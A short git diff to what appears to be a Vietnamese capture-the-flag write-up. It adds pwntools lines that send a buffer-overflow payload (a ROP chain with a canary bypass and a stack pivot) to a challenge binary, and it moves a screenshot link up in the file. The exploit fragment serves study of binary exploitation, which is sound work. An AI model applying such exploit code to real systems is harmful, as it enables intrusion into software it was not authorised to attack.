@@ -72,6 +72,13 @@ Cuối cùng thì nhập payload chứa ROPchain và địa chỉ chuyển hư�
     payload+=p64(canary)           //bypass canary
     payload+=p64(leak_rbp-0x120)   // chuyển rsp lên đầu buffer
     payload+=p64(leave)
+    input()
+    p.sendlineafter(b'>',b'1')
+    p.sendafter(b'Please enter some data:\n> ',payload)
+
+  
+  <img width="1877" height="952" alt="Screenshot 2026-09-24 153037" src="https://github.com/user-attachments/assets/abcb7781-7c35-4113-bfe0-24a972680651" />
+
 ## Script Python
 
      #!/usr/bin/python3
@@ -128,5 +135,3 @@ Cuối cùng thì nhập payload chứa ROPchain và địa chỉ chuyển hư�
     p.sendafter(b'Please enter some data:\n> ',payload)
     
     p.interactive()
-  
-  <img width="1877" height="952" alt="Screenshot 2026-09-24 153037" src="https://github.com/user-attachments/assets/abcb7781-7c35-4113-bfe0-24a972680651" />
